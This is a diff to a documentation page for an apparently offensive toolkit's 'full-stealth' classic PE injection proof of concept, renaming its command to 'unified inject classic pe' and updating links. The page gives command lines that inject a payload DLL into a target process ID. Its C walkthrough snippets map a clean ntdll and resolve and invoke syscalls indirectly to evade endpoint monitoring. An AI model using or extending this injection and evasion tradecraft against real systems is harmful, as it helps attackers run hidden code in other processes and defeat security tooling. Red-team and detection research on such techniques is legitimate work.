@@ -1,6 +1,7 @@
-# PoC: inject_pe
+# Example: Classic PE injection
 
-**Location:** `pocs/inject_pe/`
+**Command implementation:** `pocs/src/cmd_inject_classic.c`
+**Invocation:** `unified inject classic pe ...`
 
 Full-stealth classic PE injection. Locally bakes a PE image (relocations + imports), writes it into a remote process, and creates a thread at the remote entry point via `snd_inj_classic_pe`.
 
@@ -14,7 +15,7 @@ Full-stealth classic PE injection. Locally bakes a PE image (relocations + impor
 ## Command-line usage
 
 ```text
-inject_pe -f <payload_path> -p <target_pid>
+unified inject classic pe -f <payload_path> -p <target_pid> --sys
 
   -f   Path to PE payload (DLL or EXE)
   -p   Target process ID (decimal)
@@ -23,10 +24,10 @@ inject_pe -f <payload_path> -p <target_pid>
 ### Example
 
 ```bash
-inject_pe.exe -f payload.dll -p 5678
+unified.exe inject classic pe -f payload.dll -p 5678 --sys --invoke-indirect
 ```
 
-For DLL payloads, the remote thread starts at `AddressOfEntryPoint` (typically `DllMain`). The classic PE chain does not run local TLS or the loader's typed DllMain invocation — see [injection techniques](../domains/injection/techniques.md).
+For DLL payloads, the remote thread starts at `AddressOfEntryPoint` (typically `DllMain`). The classic PE chain does not run local TLS or the loader's typed DllMain invocation — see [injection techniques](../injection/internals.md).
 
 ## Walkthrough
 
@@ -37,7 +38,7 @@ snd_buffer_t     file_buf = {0};
 snd_ldr_pe_ctx_t ldr_ctx  = {0};
 snd_inj_ctx_t    inj_ctx  = {0};
 
-status = snd_disk_buffer_load(file_path, &file_buf);
+status = snd_file_win.load(file_path, &file_buf);
 ldr_ctx.raw_source = &file_buf;
 ```
 
@@ -46,7 +47,7 @@ ldr_ctx.raw_source = &file_buf;
 ```c
 PVOID ntdll = NULL;
 status = snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);
-snd_syscall_set_ntdll(ntdll);
+snd_ntdll_set_clean(ntdll);
 snd_syscall_set_resolver(snd_syscall_resolve_ssn_scan);
 snd_syscall_add_resolver(snd_syscall_resolve_ssn_sort);
 snd_syscall_set_invoker(snd_syscall_indirect_invoke_asm);
@@ -92,7 +93,7 @@ snd_buffer_free(&file_buf);
 - No TLS callback execution in the injection chain
 - No local `snd_ldr_pe_execute_image` — execution is entirely remote
 
-See [injection techniques](../domains/injection/techniques.md) for the full step table.
+See [injection techniques](../injection/internals.md) for the full step table.
 
 ## Building
 
@@ -112,6 +113,6 @@ This is the reference stealth profile for cross-process PE injection in SindriKi
 
 ## See also
 
-- [Injection API reference](../domains/injection/api_reference.md)
+- [Injection API reference](../api_reference.md)
 - [inject_shell.md](inject_shell.md) — simpler shellcode path with Win32 remote APIs
 - [loader_nowinapi.md](loader_nowinapi.md) — local-only NT profile
